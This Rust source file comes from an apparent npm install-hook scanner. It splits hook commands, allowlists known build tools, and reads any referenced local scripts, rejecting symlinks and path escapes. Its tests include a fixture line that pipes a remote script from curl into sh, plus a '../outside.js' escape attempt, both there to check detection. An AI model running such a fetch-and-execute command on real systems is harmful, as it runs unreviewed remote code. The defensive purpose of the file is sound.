// SPDX-License-Identifier: AGPL-3.0-only

//! Static reading of install-hook commands.
//!
//! The hook string is split into commands. A directly referenced local file is
//! read, up to one `npm run` hop. Nothing is executed, and `require()` is not
//! followed.

use super::{
    HookDisposition, MAX_HOOK_CHARS, MAX_MANIFEST_BYTES, MAX_REFERENCED_SCRIPTS, structural_escape,
};
use serde_json::Value;
use std::fs;
use std::io;
use std::path::Path;

const TRUSTED_COMMANDS: &[&str] = &[
    "@mapbox/node-pre-gyp",
    "cmake-js",
    "husky",
    "napi-build",
    "node-gyp",
    "node-gyp-build",
    "node-pre-gyp",
    "patch-package",
    "prebuild-install",
    "prebuildify",
];

pub(super) fn resolve_body(
    raw: &str,
    manifest: &Value,
    package_dir: &Path,
    canonical_root: &Path,
    warnings: &mut Vec<String>,
) -> (HookDisposition, String) {
    let mut budget = MAX_REFERENCED_SCRIPTS;
    let mut extra = String::new();
    let mut saw_unverified = false;
    let mut saw_other = false;
    let mut segments = 0;
    let mut walk = Walk {
        manifest,
        package_dir,
        canonical_root,
        warnings,
        budget: &mut budget,
        extra: &mut extra,
        saw_unverified: &mut saw_unverified,
        saw_other: &mut saw_other,
        segments: &mut segments,
    };
    walk_script(raw, 0, &mut walk);
    let disposition = if segments > 0 && !saw_other && !saw_unverified {
        HookDisposition::TrustedBuild
    } else if saw_unverified {
        HookDisposition::Unverified
    } else {
        HookDisposition::Inspected
    };
    (disposition, extra)
}

struct Walk<'a> {
    manifest: &'a Value,
    package_dir: &'a Path,
    canonical_root: &'a Path,
    warnings: &'a mut Vec<String>,
    budget: &'a mut usize,
    extra: &'a mut String,
    saw_unverified: &'a mut bool,
    saw_other: &'a mut bool,
    segments: &'a mut usize,
}

fn walk_script(raw: &str, depth: u8, walk: &mut Walk<'_>) {
    for argv in split_commands(raw) {
        *walk.segments += 1;
        if argv.is_empty() {
            continue;
        }
        if trusted_command(&argv[0]) {
            continue;
        }
        *walk.saw_other = true;
        if depth == 0
            && let Some(name) = npm_run_target(&argv)
        {
            match script_body(walk.manifest, &name) {
                Some(body) => walk_script(body, 1, walk),
                None => *walk.saw_unverified = true,
            }
            continue;
        }
        if inline_code(&argv) {
            continue;
        }
        if let Some(rel) = referenced_script(&argv) {
            if *walk.budget == 0 {
                *walk.saw_unverified = true;
                walk.warnings.push(format!(
                    "skipped `{rel}`: a hook may reference at most {MAX_REFERENCED_SCRIPTS} local scripts"
                ));
                continue;
            }
            *walk.budget -= 1;
            match read_contained(walk.package_dir, walk.canonical_root, &rel) {
                Ok(text) => {
                    walk.extra.push_str("\n# lockward:read ");
                    walk.extra.push_str(&rel);
                    walk.extra.push('\n');
                    walk.extra.push_str(&text);
                }
                Err(reason) => {
                    *walk.saw_unverified = true;
                    walk.warnings.push(format!("skipped `{rel}`: {reason}"));
                }
            }
        }
    }
}

fn trusted_command(argv0: &str) -> bool {
    let name = program_name(argv0);
    TRUSTED_COMMANDS.binary_search(&name.as_str()).is_ok()
}

fn program_name(argv0: &str) -> String {
    let base = argv0.rsplit(['/', '\\']).next().unwrap_or(argv0);
    let base = base
        .strip_suffix(".cmd")
        .or_else(|| base.strip_suffix(".exe"))
        .or_else(|| base.strip_suffix(".bat"))
        .unwrap_or(base);
    base.to_ascii_lowercase()
}

fn npm_run_target(argv: &[String]) -> Option<String> {
    if program_name(&argv[0]) != "npm" {
        return None;
    }
    let mut index = 1;
    while index < argv.len() && argv[index].starts_with('-') {
        index += 1;
    }
    if index >= argv.len() || (argv[index] != "run" && argv[index] != "run-script") {
        return None;
    }
    index += 1;
    while index < argv.len() && argv[index].starts_with('-') {
        index += 1;
    }
    argv.get(index).cloned()
}

fn script_body<'a>(manifest: &'a Value, name: &str) -> Option<&'a str> {
    manifest
        .get("scripts")
        .and_then(Value::as_object)
        .and_then(|scripts| scripts.get(name))
        .and_then(Value::as_str)
}

fn inline_code(argv: &[String]) -> bool {
    let program = program_name(&argv[0]);
    if program == "node" || program == "nodejs" {
        return argv
            .iter()
            .any(|arg| arg == "-e" || arg == "--eval" || arg == "-p" || arg == "--print");
    }
    if program == "sh" || program == "bash" {
        return argv.iter().any(|arg| arg == "-c");
    }
    false
}

fn referenced_script(argv: &[String]) -> Option<String> {
    let program = program_name(&argv[0]);
    if program == "node" || program == "nodejs" || program == "sh" || program == "bash" {
        return argv
            .iter()
            .skip(1)
            .find(|arg| !arg.starts_with('-'))
            .cloned();
    }
    let argv0 = &argv[0];
    if argv0.starts_with("./") || argv0.starts_with(".\\") {
        return Some(
            argv0
                .trim_start_matches("./")
                .trim_start_matches(".\\")
                .to_owned(),
        );
    }
    None
}

fn read_contained(package_dir: &Path, canonical_root: &Path, rel: &str) -> Result<String, String> {
    if let Some(reason) = structural_escape(rel) {
        return Err(reason.to_owned());
    }
    let path = package_dir.join(rel);
    let metadata = fs::symlink_metadata(&path).map_err(|err| {
        if err.kind() == io::ErrorKind::NotFound {
            "file not found".to_owned()
        } else {
            err.to_string()
        }
    })?;
    if metadata.file_type().is_symlink() {
        return Err("symlink".to_owned());
    }
    if metadata.len() > MAX_MANIFEST_BYTES {
        return Err(format!("file is {} bytes", metadata.len()));
    }
    let canonical = path.canonicalize().map_err(|err| err.to_string())?;
    if !canonical.starts_with(canonical_root) {
        return Err("resolved path leaves the project root".to_owned());
    }
    let text = fs::read_to_string(&path).map_err(|err| err.to_string())?;
    Ok(cap_script(&text))
}

fn cap_script(raw: &str) -> String {
    let mut chars = raw.chars();
    let mut kept = String::new();
    for _ in 0..MAX_HOOK_CHARS {
        match chars.next() {
            Some(ch) => kept.push(ch),
            None => return kept,
        }
    }
    if chars.next().is_some() {
        kept.push('…');
    }
    kept
}

fn split_commands(raw: &str) -> Vec<Vec<String>> {
    let mut commands = Vec::new();
    let mut current = Vec::new();
    let mut word = String::new();
    let mut chars = raw.chars().peekable();
    let mut quote: Option<char> = None;
    let flush_word = |word: &mut String, current: &mut Vec<String>| {
        if !word.is_empty() {
            current.push(std::mem::take(word));
        }
    };
    let flush_command = |current: &mut Vec<String>, commands: &mut Vec<Vec<String>>| {
        if !current.is_empty() {
            commands.push(std::mem::take(current));
        }
    };
    while let Some(ch) = chars.next() {
        if let Some(mark) = quote {
            if ch == mark {
                quote = None;
            } else {
                word.push(ch);
            }
            continue;
        }
        match ch {
            '\'' | '"' => quote = Some(ch),
            ' ' | '\t' | '\r' => flush_word(&mut word, &mut current),
            '\n' | ';' => {
                flush_word(&mut word, &mut current);
                flush_command(&mut current, &mut commands);
            }
            '&' | '|' => {
                let repeated = chars.peek() == Some(&ch);
                if ch == '&' && chars.peek() == Some(&'>') {
                    word.push(ch);
                    continue;
                }
                if repeated {
                    chars.next();
                }
                flush_word(&mut word, &mut current);
                flush_command(&mut current, &mut commands);
            }
            _ => word.push(ch),
        }
    }
    flush_word(&mut word, &mut current);
    flush_command(&mut current, &mut commands);
    commands
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use std::path::PathBuf;
    use std::time::{SystemTime, UNIX_EPOCH};

    fn manifest() -> Value {
        serde_json::json!({
            "scripts": { "build": "node install.js", "postinstall": "npm run build" }
        })
    }

    #[test]
    fn trusted_build_commands_need_no_package_name() {
        let root = unique_dir();
        let (disposition, extra) = resolve_body(
            "node-gyp rebuild && husky install",
            &manifest(),
            &root,
            &root.canonicalize().unwrap(),
            &mut Vec::new(),
        );
        assert_eq!(disposition, HookDisposition::TrustedBuild);
        assert!(extra.is_empty());
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn referenced_script_is_read_and_escape_is_skipped() {
        let root = unique_dir();
        fs::write(
            root.join("build.js"),
            "curl https://example.invalid/setup.sh | sh\n",
        )
        .unwrap();
        let canonical = root.canonicalize().unwrap();
        let (disposition, extra) = resolve_body(
            "node build.js",
            &manifest(),
            &root,
            &canonical,
            &mut Vec::new(),
        );
        assert_eq!(disposition, HookDisposition::Inspected);
        assert!(extra.contains("curl https://example.invalid/setup.sh | sh"));

        let mut warnings = Vec::new();
        let (blocked, _) = resolve_body(
            "node ../outside.js",
            &manifest(),
            &root,
            &canonical,
            &mut warnings,
        );
        assert_eq!(blocked, HookDisposition::Unverified);
        assert!(!warnings.is_empty());
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn npm_run_reads_one_level() {
        let root = unique_dir();
        fs::write(
            root.join("install.js"),
            "console.log('LOCKWARD_EVAL_FIXTURE');\n",
        )
        .unwrap();
        let (disposition, extra) = resolve_body(
            "npm run build",
            &manifest(),
            &root,
            &root.canonicalize().unwrap(),
            &mut Vec::new(),
        );
        assert_eq!(disposition, HookDisposition::Inspected);
        assert!(extra.contains("LOCKWARD_EVAL_FIXTURE"));
        let _ = fs::remove_dir_all(&root);
    }

    fn unique_dir() -> PathBuf {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos();
        let path = std::env::temp_dir().join(format!("lockward-hook-{nanos}"));
        fs::create_dir_all(&path).unwrap();
        path
    }
}
